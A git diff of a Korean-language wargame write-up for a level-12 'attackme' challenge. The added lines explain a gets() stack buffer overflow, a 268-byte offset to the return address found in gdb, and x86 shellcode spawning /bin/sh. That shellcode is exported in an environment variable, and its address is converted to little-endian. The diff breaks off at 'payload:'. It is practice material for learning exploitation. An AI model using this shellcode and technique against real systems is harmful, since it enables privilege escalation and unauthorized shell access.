@@ -114,12 +114,9 @@ cat hint 명령어를 사용해 힌트를 확인한다
 * level 13의 id가 있고
 * gets 함수로 str변수에 입력을 받고
 * 입력받은 내용을 printf로 출력한다  
+===> gets 함수로 버퍼 오버플로우 취약점이 발생하게 된다
 
-![3](/images/셋.PNG)  
-
-attackme를 실행하고 문장을 입력하면 입력된 문장이 그대로 출력되는 것을 알 수 있다  
-
-![4](/images/넷.PNG)  
+![3](/images/넷.PNG)  
 attackme를 gdb로 보기 위해 권한이 있는 tmp 디렉토리로 복사한뒤 tmp로 이동해 gdb로 확인한다  
 gdb를 확인해보면   
 * main +3 : 264만큼의 메모리 확보  
@@ -128,5 +125,34 @@ gdb를 확인해보면
     - str - 256 byte   
 ===> return address를 덮어쓰기 위해서는 264(str) + 4(sfp) = 268 byte가 필요함  
 * main + 49 : ebp - 264 -> str 버퍼부터 ebp까지 거리가 264임  
-    - ret : ebp로부터 4byte 아래에 위치 => 268 byte
+    - ret : ebp로부터 4byte 아래에 위치하기 때문에 268 byte가 된다(str 부터 ret 까지의 거리)  
 
+문제를 해결하기 위해서는 level11 처럼 쉘코드를 이용해 환경변수에 등록해야한다  
+* 쉘 코드 : "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"  
+
+* 환경변수 : export 명령어 샤용  
+    - export [환경변수명]=$(python -c 'print "쉘코드"')  
+===> - export SHELLCODE=$(python -c 'print "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"') 를 환경변수로 등록한다  
+
+![4](/images/다섯.PNG)  
+
+그 다음 env 명령어로 등록된 환경변수를 확인한다  
+
+![5](/images/여섯.PNG)  
+
+환경변수에 등록된 쉘코드의 주소를 알아내기 위한 c언어 코드를 작성한 뒤 실행한다  
+
+![6](/images/일곱.PNG)
+
+코드를 컴파일 해준다  
+
+![7](/images/여덟.PNG)  
+
+컴파일 하고 실행해주면 쉘 코드의 주소가 나온다  
+
+마지막으로 쉘 코드 주소를 리틀엔디안으로 변환하고 페이로드를 작성해 답을 구한다
+
+쉘 코드 주소 : 0xbffffc1d
+리틀엔디안 변환 : \x1d\xfc\xff\xbf 
+
+페이로드 : 
